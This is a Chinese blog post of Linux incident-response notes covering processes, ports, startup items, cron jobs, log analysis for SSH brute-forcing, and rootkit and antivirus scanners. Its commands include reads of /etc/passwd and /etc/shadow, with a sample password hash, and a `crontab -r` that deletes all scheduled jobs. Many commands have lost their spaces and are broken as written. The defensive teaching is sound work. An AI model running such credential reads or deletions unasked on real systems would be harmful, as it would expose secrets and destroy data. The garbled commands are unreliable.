<!DOCTYPE HTML>
<html lang="">
<head>
    

<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta name="keywords" content="Linux应急响应, keywords">
    <meta name="description" content="
选自网络，总结与此

文件夹介绍
dev



etc



home



lib/lib64



opt



root



sbin



tmp


用户组概念
所有组
用户组
其他组


权限概念https://blog.c">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>Linux应急响应 | only_free blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

</head>

<body>

<header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="container">
            <div class="nav-wrapper">
                <div class="brand-logo">
                    <a href="/" class="waves-effect waves-light">
                        
                        <img src="/medias/logo.png" class="logo-img hide-on-small-only">
                        
                        <span class="logo-span">only_free blog</span>
                    </a>
                </div>
                <a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
<ul class="right">
    
    <li class="hide-on-med-and-down">
        <a href="/" class="waves-effect waves-light">
            
            <i class="fa fa-home"></i>
            
            <span>首页</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/tags" class="waves-effect waves-light">
            
            <i class="fa fa-tags"></i>
            
            <span>标签</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/categories" class="waves-effect waves-light">
            
            <i class="fa fa-bookmark"></i>
            
            <span>分类</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/archives" class="waves-effect waves-light">
            
            <i class="fa fa-archive"></i>
            
            <span>档案</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/about" class="waves-effect waves-light">
            
            <i class="fa fa-user-circle-o"></i>
            
            <span>关于</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/friends" class="waves-effect waves-light">
            
            <i class="fa fa-address-book"></i>
            
            <span>友链</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/mubiao" class="waves-effect waves-light">
            
            <i class="fa fa-volume-up"></i>
            
            <span>目标</span>
        </a>
    </li>
    
    <li>
        <a id="toggleSearch" class="waves-effect waves-light">
            <i id="searchIcon" class="mdi-action-search"></i>
        </a>
    </li>

</ul>

<div class="side-nav" id="mobile-nav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">only_free blog</div>
        <div class="logo-desc">
            
            十年寒窗无人问，一举成名天下知。
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li>
            <a href="/" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-home"></i>
                
                首页
            </a>
        </li>
        
        <li>
            <a href="/tags" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-tags"></i>
                
                标签
            </a>
        </li>
        
        <li>
            <a href="/categories" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-bookmark"></i>
                
                分类
            </a>
        </li>
        
        <li>
            <a href="/archives" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-archive"></i>
                
                档案
            </a>
        </li>
        
        <li>
            <a href="/about" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-user-circle-o"></i>
                
                关于
            </a>
        </li>
        
        <li>
            <a href="/friends" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-address-book"></i>
                
                友链
            </a>
        </li>
        
        <li>
            <a href="/mubiao" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-volume-up"></i>
                
                目标
            </a>
        </li>
        
        
    </ul>

    <div class="social-link"><a href="#!" class="tooltipped" target="_blank" data-tooltip="微信联系我：refuel_iamfree" data-position="top" data-delay="50">
    <i class="fa fa-weixin"></i>
</a>
<a href="mailto:1900065568@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
    <i class="fa fa-envelope-open"></i>
</a>
<a href="#!" class="tooltipped" data-tooltip="QQ联系我: 1900065568" data-position="top" data-delay="50">
    <i class="fa fa-qq"></i>
</a>
</div>
</div>

            </div>
        </div>

        
    </nav>
</header>


<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
    <div class="container">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <div class="description center-align post-title">
                        Linux应急响应
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1,
    #articleContent h2,
    #articleContent h3,
    #articleContent h4,
    #articleContent h5,
    #articleContent h6 {
        padding-top: 76px;
        margin-top: -76px;
    }

    #articleContent h1 {
        line-height: 3.5rem;
    }

    #articleContent h2 {
        line-height: 3.2rem;
    }

    #articleContent h3 {
        line-height: 2.8rem;
    }

    #articleContent h4 {
        line-height: 2.5rem;
    }

    #articleContent h5 {
        line-height: 2.2rem;
    }

    #articleContent h6 {
        line-height: 1.9rem;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link::before {
        background-color: #42b983;
    }
</style>
<div class="row">
    <div class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            
            <div class="article-tag">
            <span class="chip bg-color"><span id="busuanzi_value_page_pv"></span> ℃</span>
                
                <a href="/tags/应急响应/" target="_blank">
                    <span class="chip bg-color">应急响应</span>
                </a>
                
            </div>
            
            <div class="post-info">
                

                <span class="post-date">
                    <i class="fa fa-clock-o fa-fw"></i>2019-05-23
                </span>
            </div>
        </div>
        <hr>
        <div class="card-content article-card-content">
            <div id="articleContent">
                <blockquote>
<p>选自网络，总结与此</p>
</blockquote>
<h3 id="文件夹介绍"><a href="#文件夹介绍" class="headerlink" title="文件夹介绍"></a>文件夹介绍</h3><ul>
<li>dev</li>
</ul>
<p><img src="http://static.zybuluo.com/1kbfree/3zcrpvg2tv8v2qgv6qasj976/image_1dau6mcga1c1f1ooo16pm1ctd1srm1j.png" alt="image_1dau6mcga1c1f1ooo16pm1ctd1srm1j.png-74kB"></p>
<ul>
<li>etc</li>
</ul>
<p><img src="http://static.zybuluo.com/1kbfree/cwusv528w9ttfu25b4u76omu/image_1dau6n85f1iuhe8m1gs61vdl1vft20.png" alt="image_1dau6n85f1iuhe8m1gs61vdl1vft20.png-62.3kB"></p>
<ul>
<li>home</li>
</ul>
<p><img src="http://static.zybuluo.com/1kbfree/mgbiy9n29f2bk5wa20xx5bgr/image_1dau6qimqjfutmt1n6omvh192g2d.png" alt="image_1dau6qimqjfutmt1n6omvh192g2d.png-72.4kB"></p>
<ul>
<li>lib/lib64</li>
</ul>
<p><img src="http://static.zybuluo.com/1kbfree/p1haahb6agk7z2qdhltv2ri3/image_1dau6s4m4as61fpusoa19am1t872q.png" alt="image_1dau6s4m4as61fpusoa19am1t872q.png-13.4kB"></p>
<ul>
<li>opt</li>
</ul>
<p><img src="http://static.zybuluo.com/1kbfree/08wi1ffko43xqj0e7thb0rw0/image_1dau6sjq21ae9p9ef3qt2147v37.png" alt="image_1dau6sjq21ae9p9ef3qt2147v37.png-6kB"></p>
<ul>
<li>root</li>
</ul>
<p><img src="http://static.zybuluo.com/1kbfree/13s616op8k845yqy7ruv3n1x/image_1dau6t5eo1l2915s29lhbtteur3k.png" alt="image_1dau6t5eo1l2915s29lhbtteur3k.png-4.8kB"></p>
<ul>
<li>sbin</li>
</ul>
<p><img src="http://static.zybuluo.com/1kbfree/q8f9g4jwkbp48gg8ay8faolx/image_1dau70dohgnqhll1shi5qt1ekn41.png" alt="image_1dau70dohgnqhll1shi5qt1ekn41.png-113.5kB"></p>
<ul>
<li>tmp</li>
</ul>
<p><img src="http://static.zybuluo.com/1kbfree/19tlxhdr45x6zifxi8fszya6/image_1dau710pu1d0lsp0qaa1nv5deb4e.png" alt="image_1dau710pu1d0lsp0qaa1nv5deb4e.png-14.9kB"></p>
<h3 id="用户组概念"><a href="#用户组概念" class="headerlink" title="用户组概念"></a>用户组概念</h3><ul>
<li>所有组</li>
<li>用户组</li>
<li>其他组</li>
</ul>
<p><img src="http://static.zybuluo.com/1kbfree/f33bxu4ikw99zp6c30m88wxm/image_1dau74f82fkh1dk228ivi1o3r4r.png" alt="image_1dau74f82fkh1dk228ivi1o3r4r.png-79.2kB"></p>
<h4 id="权限概念"><a href="#权限概念" class="headerlink" title="权限概念"></a>权限概念</h4><p><a href="https://blog.csdn.net/qq_28451255/article/details/80468712" target="_blank" rel="noopener">https://blog.csdn.net/qq_28451255/article/details/80468712</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/iz6pzc8ku1lyq2nt3ln1r4hv/image_1dau7mphp1eae6pod8b1l1ni1p58.png" alt="image_1dau7mphp1eae6pod8b1l1ni1p58.png-53.8kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/enww77c92iyzk7szzdths6ck/image_1dau8st1e1fph1hot1trs1f3truc65.png" alt="image_1dau8st1e1fph1hot1trs1f3truc65.png-94.9kB"></p>
<h5 id="stat命令"><a href="#stat命令" class="headerlink" title="stat命令"></a>stat命令</h5><p><img src="http://static.zybuluo.com/1kbfree/29vvvj4je2vs1b1p4gavaab9/image_1dau8vbhl10u41bbjp0o1gg71ano6v.png" alt="image_1dau8vbhl10u41bbjp0o1gg71ano6v.png-220.6kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/6619083ac5y2nckgqi2xowfj/image_1dau8ug3n18321h6lh0i1a2g12s86i.png" alt="image_1dau8ug3n18321h6lh0i1a2g12s86i.png-79.3kB"></p>
<h5 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h5><p><img src="http://static.zybuluo.com/1kbfree/fbxnqbhpwprpxho6p3h7f5jq/image_1dau9166t170v1oia1q9c1fcm887c.png" alt="image_1dau9166t170v1oia1q9c1fcm887c.png-29.8kB"></p>
<h5 id="netstae"><a href="#netstae" class="headerlink" title="netstae"></a>netstae</h5><p><img src="http://static.zybuluo.com/1kbfree/d1kpwfxynye6w966lcmt8qe4/image_1dau957r41ujqm5qg6lcff1o487p.png" alt="image_1dau957r41ujqm5qg6lcff1o487p.png-35.8kB"></p>
<pre><code>看22端口的链接情况 netstat -anplt|grep 22
</code></pre><p><img src="http://static.zybuluo.com/1kbfree/bk1ubjha6gs8szs9vyzrurfd/image_1daueiseuqfgpmhs7i5lj1kfsdu.png" alt="image_1daueiseuqfgpmhs7i5lj1kfsdu.png-256.9kB"></p>
<h5 id="lsod"><a href="#lsod" class="headerlink" title="lsod"></a>lsod</h5><p><img src="http://static.zybuluo.com/1kbfree/vqntxquze5hvgni8tstovu0g/1.png" alt="1.png-26.5kB"></p>
<pre><code>lsof -i :80
查看端口为80的tcp或udp进程
</code></pre><h5 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h5><blockquote>
<p>查进程</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/nxhs1edpbhfmmiqkn5d9jmdf/image_1dau9ofmdt07ftc10uj1bkr1kqb8i.png" alt="image_1dau9ofmdt07ftc10uj1bkr1kqb8i.png-29.7kB"></p>
<h5 id="top-htop"><a href="#top-htop" class="headerlink" title="top/htop"></a>top/htop</h5><blockquote>
<p>进程</p>
</blockquote>
<p><code>top</code>和<code>htop</code>和<code>window</code>任务管理器一样</p>
<h5 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h5><blockquote>
<p>查文件内容</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/5zzbn8degsv2gsfr4tvqka8x/image_1dau9stpuqghncd91ikpooji8v.png" alt="image_1dau9stpuqghncd91ikpooji8v.png-54.7kB"></p>
<pre><code>-i 忽略大小写
-v 不包含匹配字符
</code></pre><pre><code>egrep -v &quot;root|test&quot; /etc/passwd 过滤passwd文件的root和test的内容
egrep &quot;root|test&quot; /etc/passwd 只查找passwd文件的root和test的内容
</code></pre><h5 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h5><blockquote>
<p>抓包</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/nhetuzwra8ormbn392bell0n/image_1daua5oit10p21o59a8vop01abu9s.png" alt="image_1daua5oit10p21o59a8vop01abu9s.png-112.1kB"></p>
<h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><blockquote>
<p>查文件名</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/a640h23jypueyp4o7h5nw8qm/image_1dauaailg5md1st41l9a17c1bgia9.png" alt="image_1dauaailg5md1st41l9a17c1bgia9.png-91.5kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/3xle9wiu0e3dssvkpg7nytou/image_1dauajgse11m5j4mlvl9662a7am.png" alt="image_1dauajgse11m5j4mlvl9662a7am.png-111.1kB"></p>
<h5 id="which"><a href="#which" class="headerlink" title="which"></a>which</h5><blockquote>
<p>看程序所在位置</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/llqkq0h3jtejt2lo1p97nb8j/image_1dauaq29h1158jcc1fl61aomilb3.png" alt="image_1dauaq29h1158jcc1fl61aomilb3.png-20.5kB"></p>
<h5 id="bash-history"><a href="#bash-history" class="headerlink" title=".bash_history"></a>.bash_history</h5><blockquote>
<p>看执行历史命令</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/na4b23v2pfxmcw01d4wlf9mb/image_1daub45k9h28q1i11251k2f11m3bg.png" alt="image_1daub45k9h28q1i11251k2f11m3bg.png-62.4kB"></p>
<p>一般用法，进入<code>tmp</code>目录把历史执行命令保存到这里</p>
<p><img src="http://static.zybuluo.com/1kbfree/giw14n2tpl0sz01a3at36h6s/image_1daub92kup8t1b1r11cor901i41bt.png" alt="image_1daub92kup8t1b1r11cor901i41bt.png-69.6kB"></p>
<p>把所有结果集合起来</p>
<p><img src="http://static.zybuluo.com/1kbfree/wmt0dr5amk7hrn7uvtlcpkrm/image_1daubgmgsfgi1daj1spas2s1cjdca.png" alt="image_1daubgmgsfgi1daj1spas2s1cjdca.png-103.5kB"></p>
<h5 id="检测系统关键文件"><a href="#检测系统关键文件" class="headerlink" title="检测系统关键文件"></a>检测系统关键文件</h5><p>1、用户信息文件<code>/etc/passwd</code></p>
<pre><code>root:x\:0:0:root:/root:/bin/bash
account:password:UID:GID:GECOS:directory:shell
</code></pre><p>对应的信息：</p>
<pre><code>用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell
</code></pre><blockquote>
<p>无密码只允许本机登陆，远程不允许登陆</p>
</blockquote>
<p>2、影子文件<code>/etc/shadow</code></p>
<pre><code>root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::

用户名：加密密码（可以看强弱来判断是否可能出现弱口令导致被直接爆破的）：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留
</code></pre><p>3、用户组<code>/etc/group</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/s2tntcq8m8an0bntafk5fs5k/image_1daubteerqhfunbc1f1tjg1lufcn.png" alt="image_1daubteerqhfunbc1f1tjg1lufcn.png-15kB"></p>
<p>4、用户登录时都会运行的环境变量设置<code>/etc/profile</code></p>
<h3 id="检测开机启动项"><a href="#检测开机启动项" class="headerlink" title="检测开机启动项"></a>检测开机启动项</h3><p><img src="http://static.zybuluo.com/1kbfree/ncqkr8mwl9lz5hq1i4yukdg1/image_1daucrahmqte2t71ib1lqg16u6d4.png" alt="image_1daucrahmqte2t71ib1lqg16u6d4.png-47.2kB"></p>
<h4 id="查看运行级别"><a href="#查看运行级别" class="headerlink" title="查看运行级别"></a>查看运行级别</h4><pre><code>runlevel
</code></pre><h4 id="系统默认允许级别"><a href="#系统默认允许级别" class="headerlink" title="系统默认允许级别"></a>系统默认允许级别</h4><pre><code>vi  /etc/inittab
id=3：initdefault  系统开机后直接进入哪个运行级别
</code></pre><h4 id="开机启动配置文件"><a href="#开机启动配置文件" class="headerlink" title="开机启动配置文件"></a>开机启动配置文件</h4><pre><code>/etc/rc.local
/etc/rc.d/rc[0~6].d
</code></pre><p>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 <code>/etc/init.d</code> 目录下，然后在 <code>/etc/rc.d/rc*.d</code> 中建立软链接（<code>window</code>的快捷方式）即可</p>
<pre><code>root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh
</code></pre><p>此处 <code>sshd</code> 是具体服务的脚本文件，<code>S100ssh</code> 是其软链接，<code>S</code> 开头代表加载时自启动；如果是 <code>K</code> 开头的脚本文件，代表运行级别加载时需要关闭的。</p>
<h3 id="入侵排查"><a href="#入侵排查" class="headerlink" title="入侵排查"></a>入侵排查</h3><blockquote>
<p>启动项文件</p>
</blockquote>
<pre><code>more /etc/rc.local    
/etc/rc.d/rc[0~6].d
ls -l /etc/rc.d/rc3.d/
</code></pre><h4 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h4><h5 id="1、利用-crontab-创建计划任务"><a href="#1、利用-crontab-创建计划任务" class="headerlink" title="1、利用 crontab 创建计划任务"></a>1、利用 <code>crontab</code> 创建计划任务</h5><pre><code>crontab -l   列出某个用户 cron 服务的详细内容
crontab -r   删除每个用户 cront 任务(谨慎：删除所有的计划任务)
crontab -e   使用编辑器编辑当前的 crontab 文件 
</code></pre><p><strong>默认编写的 <code>crontab</code> 文件会保存在 ( <code>/var/spool/cron/用户名</code> 例如: <code>/var/spool/cron/root</code>）</strong></p>
<p><strong>如：<code>*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt</code> 每分钟写入文件</strong></p>
<h5 id="2、利用-anacron-实现异步定时任务调度"><a href="#2、利用-anacron-实现异步定时任务调度" class="headerlink" title="2、利用 anacron 实现异步定时任务调度"></a>2、利用 <code>anacron</code> 实现异步定时任务调度</h5><p>每天运行 <code>/home/backup.sh</code> 脚本：</p>
<pre><code>vi /etc/anacrontab 

@daily    10    example.daily   /bin/bash /home/backup.sh
</code></pre><p>当机器在 <code>backup.sh</code> 期望被运行时是关机的，<code>anacron</code> 会在机器开机十分钟之后运行它，而不用再等待 7 天。</p>
<h5 id="3、重点关注以下目录是否存在脚本"><a href="#3、重点关注以下目录是否存在脚本" class="headerlink" title="3、重点关注以下目录是否存在脚本"></a>3、重点关注以下目录是否存在脚本</h5><pre><code>/var/spool/cron/* 

/etc/crontab

/etc/cron.d/*

/etc/cron.daily/* 

/etc/cron.hourly/* 

/etc/cron.monthly/*

/etc/cron.weekly/

/etc/anacrontab

/var/spool/anacron/*
</code></pre><p>小技巧：</p>
<pre><code>more /etc/cron.daily/*  查看目录下所有文件
</code></pre><h4 id="服务自启动"><a href="#服务自启动" class="headerlink" title="服务自启动"></a>服务自启动</h4><h5 id="第一种修改方法："><a href="#第一种修改方法：" class="headerlink" title="第一种修改方法："></a>第一种修改方法：</h5><pre><code>chkconfig [--level 运行级别][独立服务名][on|off]

chkconfig –level  2345 httpd on  开启自启动

chkconfig httpd on （默认 level 是 2345）
</code></pre><h5 id="第二种修改方法："><a href="#第二种修改方法：" class="headerlink" title="第二种修改方法："></a>第二种修改方法：</h5><pre><code>修改 /etc/re.d/rc.local 文件  

加入 /etc/init.d/httpd start
</code></pre><h5 id="第三种修改方法："><a href="#第三种修改方法：" class="headerlink" title="第三种修改方法："></a>第三种修改方法：</h5><pre><code>使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。
</code></pre><h4 id="查询已安装的服务"><a href="#查询已安装的服务" class="headerlink" title="查询已安装的服务"></a>查询已安装的服务</h4><pre><code>chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务

ps aux | grep crond 查看当前服务
</code></pre><p>系统在<code>3</code>与<code>5</code>的级别下启用</p>
<pre><code>chkconfig --list | grep &quot;3:启用|5:启用&quot;
</code></pre><p>查看服务安装位置 ，一般是在 <code>/user/local/</code></p>
<pre><code>service httpd start
</code></pre><p>搜索 <code>/etc/rc.d/init.d/</code>  查看是否存在</p>
<h4 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h4><pre><code>日志默认存放位置：/var/log/

查看日志配置情况：more /etc/rsyslog.conf
</code></pre><p><img src="http://static.zybuluo.com/1kbfree/uuv68q8sfc1hdlttszppmr1b/image_1daudq0dfhbi289qnp3rq7uqdh.png" alt="image_1daudq0dfhbi289qnp3rq7uqdh.png-321.8kB"></p>
<h5 id="日志分析技巧"><a href="#日志分析技巧" class="headerlink" title="日志分析技巧"></a>日志分析技巧</h5><p>1、定位有多少IP在爆破主机的 <code>root</code> 帐号：</p>
<pre><code>grep &quot;Failed password for root&quot; /var/log/secure | awk &#39;{print $11}&#39; | sort | uniq -c | sort -nr | more
</code></pre><p>定位有哪些 <code>IP</code> 在爆破：</p>
<pre><code>grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c
</code></pre><p>爆破用户名字典是什么？</p>
<pre><code>grep &quot;Failed password&quot; /var/log/secure|perl -e &#39;while($_=&lt;&gt;){ /for(.*?) from/; print &quot;$1\n&quot;;}&#39;|uniq -c|sort -nr
</code></pre><p>2、登录成功的 IP 有哪些：     </p>
<pre><code>grep &quot;Accepted &quot; /var/log/secure | awk &#39;{print $11}&#39; | sort | uniq -c | sort -nr | more
</code></pre><p>登录成功的日期、用户名、IP：</p>
<pre><code>grep &quot;Accepted &quot; /var/log/secure | awk &#39;{print $1,$2,$3,$9,$11}&#39; 
</code></pre><p>3、增加一个用户 <code>kali</code> 日志：</p>
<pre><code>Jul1000:12:15localhostuseradd[2382]: newgroup: name=kali, GID=1001
Jul1000:12:15localhostuseradd[2382]: newuser: name=kali, UID=1001, GID=1001, home=/home/kali
, shell=/bin/bash
Jul1000:12:58localhostpasswd: pam_unix(passwd:chauthtok): passwordchangedforkali
#grep&quot;useradd&quot;/var/log/secure
</code></pre><p>4、删除用户 <code>kali</code> 日志：</p>
<pre><code>Jul1000:14:17localhostuserdel[2393]: deleteuser&#39;kali&#39;
Jul1000:14:17localhostuserdel[2393]: removedgroup&#39;kali&#39; ownedby&#39;kali&#39;
Jul1000:14:17localhostuserdel[2393]: removedshadowgroup&#39;kali&#39; ownedby&#39;kali&#39;
#grep&quot;userdel&quot;/var/log/secure
</code></pre><p>5、<code>su</code> 切换用户：</p>
<pre><code>Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)
</code></pre><p><code>sudo</code> 授权执行:</p>
<pre><code>sudo -lJul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now
</code></pre><h3 id="工具篇"><a href="#工具篇" class="headerlink" title="工具篇"></a>工具篇</h3><h4 id="一、Rootkit-查杀"><a href="#一、Rootkit-查杀" class="headerlink" title="一、Rootkit 查杀"></a>一、<code>Rootkit</code> 查杀</h4><pre><code>chkrootkit :
http://www.chkrootkit.org 
</code></pre><h5 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h5><pre><code>wgetftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
tar zxvf chkrootkit.tar.gz
cdchkrootkit-0.52
makesense
#编译完成没有报错的话执行检查
./chkrootkit
</code></pre><h4 id="二、rkhunter"><a href="#二、rkhunter" class="headerlink" title="二、rkhunter"></a>二、<code>rkhunter</code></h4><pre><code>rkhunter
http://rkhunter.sourceforge.net
</code></pre><h5 id="使用方法：-1"><a href="#使用方法：-1" class="headerlink" title="使用方法："></a>使用方法：</h5><pre><code>Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz
tar -zxvfrkhunter-1.4.4.tar.gz
cdrkhunter-1.4.4
./installer.sh --install
rkhunter -c
</code></pre><h3 id="二、病毒查杀"><a href="#二、病毒查杀" class="headerlink" title="二、病毒查杀"></a>二、病毒查杀</h3><h4 id="三、Clamav"><a href="#三、Clamav" class="headerlink" title="三、Clamav"></a>三、<code>Clamav</code></h4><pre><code>ClamAV 的官方下载地址为：
http://www.clamav.net/download.html
</code></pre><h5 id="安装方式一："><a href="#安装方式一：" class="headerlink" title="安装方式一："></a>安装方式一：</h5><p>1、安装 <code>zlib</code>：</p>
<pre><code>wgethttp://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz 
tar -zxvfzlib-1.2.7.tar.gz
cdzlib-1.2.7
#安装一下gcc编译环境： yum install gcc
CFLAGS=&quot;-O3 -fPIC&quot;./configure --prefix=/usr/local/zlib/
make&amp;&amp; makeinstall
</code></pre><p>2、添加用户组 <code>clamav</code> 和组成员 <code>clamav</code>：</p>
<pre><code>groupadd clamav
useradd -gclamav -s/bin/false -c&quot;Clam AntiVirus&quot;clamav
</code></pre><p>3、安装 <code>Clamav</code></p>
<pre><code>tar –zxvf clamav-0.97.6.tar.gz
cdclamav-0.97.6
./configure --prefix=/opt/clamav --disable-clamav-with-zlib=/usr/local/zlib
make
makeinstall
</code></pre><p>4、配置 <code>Clamav</code></p>
<pre><code>mkdir/opt/clamav/logs
mkdir/opt/clamav/updata
touch/opt/clamav/logs/freshclam.log
touch/opt/clamav/logs/clamd.log
cd/opt/clamav/logs
chownclamav:clamav clamd.log
chownclamav:clamav freshclam.log
</code></pre><p>5、<code>ClamAV</code> 使用：</p>
<pre><code>/opt/clamav/bin/freshclam 升级病毒库

./clamscan –h 查看相应的帮助信息

./clamscan -r /home  扫描所有用户的主目录就使用

./clamscan -r --bell -i /bin  扫描 bin 目录并且显示有问题的文件的扫描结果
</code></pre><p>安装方式二： </p>
<pre><code>#安装
yum install -yclamav

#更新病毒库
freshclam

#扫描方法
clamscan -r/etc --max-dir-recursion=5-l/root/etcclamav.log
clamscan -r/bin --max-dir-recursion=5-l/root/binclamav.log
clamscan -r/usr --max-dir-recursion=5-l/root/usrclamav.log

#扫描并杀毒
clamscan -r --remove/usr/bin/bsd-port
clamscan -r --remove/usr/bin/
clamscan -r--remove/usr/local/zabbix/sbin

#查看日志发现
cat/root/usrclamav.log |grep FOUND
</code></pre><h4 id="四、webshell-查杀"><a href="#四、webshell-查杀" class="headerlink" title="四、webshell 查杀"></a>四、<code>webshell</code> 查杀</h4><p><code>linux</code> 版：</p>
<p>河马 <code>webshell</code> 查杀：</p>
<pre><code>http://www.shellpub.com
</code></pre><p>深信服 <code>Webshell</code> 网站后门检测工具：</p>
<pre><code>http://edr.sangfor.com.cn/backdoor_detection.html
</code></pre><h4 id="五、RPM-check-检查"><a href="#五、RPM-check-检查" class="headerlink" title="五、RPM check 检查"></a>五、<code>RPM check</code> 检查</h4><p>系统完整性可以通过 <code>rpm</code> 自带的 <code>-Va</code> 来校验检查所有的 <code>rpm</code> 软件包，查看哪些命令是否被替换了：</p>
<pre><code>./rpm -Va &gt; rpm.log
</code></pre><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是 8 位长字符串，每个字符都用以表示文件与 RPM 数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p>
<p>验证内容中的 8 个信息的具体内容如下：</p>
<pre><code>S文件大小是否改变

M文件的类型或文件的权限（rwx）是否被改变

5文件 MD5 校验是否改变（可以看成文件内容是否改变）

D设备中，从代码是否改变

L文件路径是否改变

U文件的属主（所有者）是否改变

G文件的属组是否改变

T文件的修改时间是否改变

